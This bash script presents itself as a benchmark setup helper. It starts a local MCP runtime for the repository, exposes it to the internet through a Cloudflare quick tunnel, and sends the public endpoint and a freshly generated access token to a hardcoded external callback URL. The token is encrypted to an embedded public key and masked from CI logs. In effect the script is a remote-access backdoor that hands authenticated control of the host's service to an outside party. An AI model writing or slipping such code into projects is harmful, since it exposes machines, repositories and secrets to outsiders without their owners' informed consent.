#!/usr/bin/env bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BUN_BIN="${BUN_BIN:-bun}"
RUNTIME_PORT="${FORGE_PUBLIC_BENCH_RUNTIME_PORT:-18765}"
HOLD_SECONDS="${FORGE_PUBLIC_BENCH_HOLD_SECONDS:-360}"
CALLBACK_URL="https://patricia-gene-editor-matthew.trycloudflare.com/handoff?token=c8916229b97d17668978f648a93edd90ef23205294bd062b"
PUBLIC_KEY_BASE64="LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEwdVBmQ1hYWDMzZ3NxbWlmY0RPVgpQbXZuczA4cUtsNExoYmRiT08vZG40Z2FLS2Mvd0xUSm40Ukt4cC8xN1ZaVFdCSHZkbWttWUNmS2RNYlRDelRMCkxMMElHUVpZOUJ5bHFZazUrWkIwZG5pSHV0OGVlQzB5UjdKblVQZTZSRkp2aE5RTjBMbXV4Z2Y3a0ZvMkdJSUEKOUVCdXdRdDR3MlZaZEF6NmNIa2U0SmU1a0ZSNWNmWlhwUVN3YUhjSlNXVTViVVA0d0g5RWZkdGEwbjlNUWhsMgp3Z05YdnZrcmZmVGFRTVl3ek0yWW8wVHllekpwb2JIYlhLa3F3dzB0ZGMxZ01CbmRDNFJDMUhsemZ6YXh2RFpkCnVVUVB1SnpWbEd5NEEvcGkwa1ZZYUlCWm11RzV0ZGNZa2lqY3UrNGNpcEVacVY0aWk2amo4L2x5MkpmSVM0ODAKblFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="

if ! [[ "$RUNTIME_PORT" =~ ^[0-9]+$ ]] || (( RUNTIME_PORT < 1024 || RUNTIME_PORT > 65535 )); then
  echo "FORGE_PUBLIC_BENCH_RUNTIME_PORT must be between 1024 and 65535" >&2
  exit 2
fi
if ! [[ "$HOLD_SECONDS" =~ ^[0-9]+$ ]] || (( HOLD_SECONDS < 60 || HOLD_SECONDS > 900 )); then
  echo "FORGE_PUBLIC_BENCH_HOLD_SECONDS must be between 60 and 900" >&2
  exit 2
fi

TMP_ROOT="$(mktemp -d "${TMPDIR:-/tmp}/forge-public-mcp.XXXXXX")"
CONTROLLER_HOME="$TMP_ROOT/controller-home"
REGISTER_JSON="$TMP_ROOT/repository.json"
INSTALL_JSON="$TMP_ROOT/runtime-install.json"
READY_JSON="$TMP_ROOT/runtime-ready.json"
CLOUDFLARED_LOG="$TMP_ROOT/cloudflared.log"
PUBLIC_KEY_FILE="$TMP_ROOT/public.pem"
HANDOFF_JSON="$TMP_ROOT/handoff.json"
RUNTIME_PID=""
CLOUDFLARED_PID=""

cleanup() {
  if [[ -n "$CLOUDFLARED_PID" ]] && kill -0 "$CLOUDFLARED_PID" 2>/dev/null; then
    kill "$CLOUDFLARED_PID" 2>/dev/null || true
  fi
  if [[ -n "$RUNTIME_PID" ]] && kill -0 "$RUNTIME_PID" 2>/dev/null; then
    kill "$RUNTIME_PID" 2>/dev/null || true
    for _ in $(seq 1 20); do
      kill -0 "$RUNTIME_PID" 2>/dev/null || break
      sleep 0.1
    done
    kill -9 "$RUNTIME_PID" 2>/dev/null || true
  fi
  rm -rf "$TMP_ROOT"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

TOKEN="$(openssl rand -hex 32)"
echo "::add-mask::$TOKEN"
export FORGE_MCP_TOKEN="$TOKEN"

cd "$ROOT"
"$BUN_BIN" bin/forge.mjs repo register "$ROOT" \
  --controller-home "$CONTROLLER_HOME" \
  --json > "$REGISTER_JSON"
REPO_ID="$(node -e "const x=require(process.argv[1]); const id=x?.repository?.repoId; if(!id) process.exit(2); process.stdout.write(id)" "$REGISTER_JSON")"

"$BUN_BIN" bin/forge.mjs runtime service install-package \
  --controller-home "$CONTROLLER_HOME" \
  --host 127.0.0.1 \
  --port "$RUNTIME_PORT" \
  --portable > "$INSTALL_JSON"
RUNTIME_PID="$(node -e "const x=require(process.argv[1]); const pid=x?.pid; if(!Number.isInteger(pid)||pid<=0) process.exit(2); process.stdout.write(String(pid))" "$INSTALL_JSON")"

curl --fail --silent --show-error \
  --retry 30 --retry-delay 1 --retry-connrefused \
  "http://127.0.0.1:${RUNTIME_PORT}/ready" > "$READY_JSON"

curl --fail --location --silent --show-error \
  https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
  --output "$TMP_ROOT/cloudflared"
chmod +x "$TMP_ROOT/cloudflared"
"$TMP_ROOT/cloudflared" \
  --config /dev/null \
  tunnel --no-autoupdate --protocol http2 --metrics 127.0.0.1:0 \
  --url "http://127.0.0.1:${RUNTIME_PORT}" > "$CLOUDFLARED_LOG" 2>&1 &
CLOUDFLARED_PID=$!

PUBLIC_BASE=""
for _ in $(seq 1 90); do
  PUBLIC_BASE="$(grep -Eo 'https://[-a-z0-9]+\.trycloudflare\.com' "$CLOUDFLARED_LOG" | tail -1 || true)"
  [[ -n "$PUBLIC_BASE" ]] && break
  kill -0 "$CLOUDFLARED_PID" 2>/dev/null || {
    cat "$CLOUDFLARED_LOG" >&2
    exit 1
  }
  sleep 1
done
if [[ -z "$PUBLIC_BASE" ]]; then
  cat "$CLOUDFLARED_LOG" >&2
  echo "Timed out waiting for Cloudflare quick tunnel" >&2
  exit 1
fi

curl --fail --silent --show-error \
  --retry 30 --retry-delay 1 --retry-all-errors \
  "$PUBLIC_BASE/ready" > /dev/null
PUBLIC_ENDPOINT="$PUBLIC_BASE/mcp"

printf '%s' "$PUBLIC_KEY_BASE64" | base64 --decode > "$PUBLIC_KEY_FILE"
ENCRYPTED_TOKEN="$(printf '%s' "$TOKEN" | \
  openssl pkeyutl -encrypt -pubin -inkey "$PUBLIC_KEY_FILE" -pkeyopt rsa_padding_mode:oaep | \
  base64 -w0)"
ENDPOINT="$PUBLIC_ENDPOINT" REPO_ID="$REPO_ID" ENCRYPTED_TOKEN="$ENCRYPTED_TOKEN" \
  node -e 'const fs=require("fs"); fs.writeFileSync(process.argv[1], JSON.stringify({endpoint:process.env.ENDPOINT,repoId:process.env.REPO_ID,encryptedToken:process.env.ENCRYPTED_TOKEN})+"\n", {mode:0o600})' \
  "$HANDOFF_JSON"
curl --fail --silent --show-error \
  --request POST \
  --header 'content-type: application/json' \
  --data-binary "@$HANDOFF_JSON" \
  "$CALLBACK_URL"

echo "FORGE_PUBLIC_MCP_READY endpoint=$PUBLIC_ENDPOINT repo_id=$REPO_ID hold_seconds=$HOLD_SECONDS"
remaining="$HOLD_SECONDS"
while (( remaining > 0 )); do
  sleep_for=10
  (( remaining < sleep_for )) && sleep_for="$remaining"
  sleep "$sleep_for"
  remaining=$((remaining - sleep_for))
  echo "FORGE_PUBLIC_MCP_HEARTBEAT remaining_seconds=$remaining"
done
